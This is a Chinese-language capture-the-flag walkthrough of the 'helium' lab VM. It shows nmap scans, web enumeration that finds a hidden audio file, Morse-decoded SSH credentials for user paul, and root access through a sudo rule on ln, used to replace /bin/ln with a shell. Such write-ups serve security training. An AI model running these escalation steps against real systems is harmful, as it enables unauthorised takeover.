> ⏲️ Release Date // 2020-11-22
>
> ✔️ MD5 // 6c034ba16620358483d344f0572ad020
>
> ☠ Root // 187
>
> 💀 User // 191

### 主机探测和nmap扫描

进行TCP全端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.123
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 09:27 EDT
Nmap scan report for 192.168.56.123
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:6C:D1:C6 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds
```

进行22，80端口详细信息扫描

```bash
nmap -sT -sV -sC -O -p22,80 192.168.56.123
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:f6:55:5f:c6:fa:fb:14:15:ae:4a:2b:38:d8:4a:30 (RSA)
|   256 b7:ac:87:6d:c4:f9:e3:9a:d4:6e:e0:4f:da:aa:22:20 (ECDSA)
|_  256 fe:e8:05:af:23:4d:3a:82:2a:64:9b:f7:35:e4:44:4a (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: RELAX
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:6C:D1:C6 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

### web渗透

访问web页面，发现提示

> <!-- Please paul, stop uploading weird .wav files using /upload_sound -->

得到一个人名paul，知道一个目录

/upload_sound

> Upload disabled (or not).

测试是否可以上传文件

```bash
curl -T test http://192.168.56.123/upload_sound
```

```
<html>
<head><title>405 Not Allowed</title></head>
<body bgcolor="white">
<center><h1>405 Not Allowed</h1></center>
<hr><center>nginx/1.14.2</center>
</body>
</html>
```

不能上传文件

### 目录扫描

```
http://192.168.56.123/upload_sound/
http://192.168.56.123/yay/
http://192.168.56.123/bootstrap.min.css
```

访问`bootstrap.min.css`

> /yay/mysecretsound.wav

得到一个wav文件

使用 `audacity` 进行查看

![image-20240525220414499](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240525220414499.png)

发现频谱图存在信息，使用 [Morse Code Adaptive Audio Decoder | Morse Code World](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) 进行查看

发现提取出来两份字符串：

```plaintext
ETAIE4SIET
dancingpassyo
```

猜测可能是ssh的凭据

> paul:dancingpassyo成功进入

### 提权

#### sudo提权

```bash
sudo -l
```

```bash
paul@helium:~$ sudo -l
Matching Defaults entries for paul on helium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln
```

利用ln进行提权

```bash
paul@helium:~$ sudo /usr/bin/ln -fs /bin/bash /bin/ln
# cat /root/root.txt
ilovetoberoot
```

> -f, --force     强行删除任何已存在的目标文件
>
> -s, --symbolic              对源文件建立符号连接，而非硬连接

```sh
# ls -ls /bin/ln
0 lrwxrwxrwx 1 root root 7 May 25 09:52 /bin/ln -> /bin/sh
```

拿到root.txt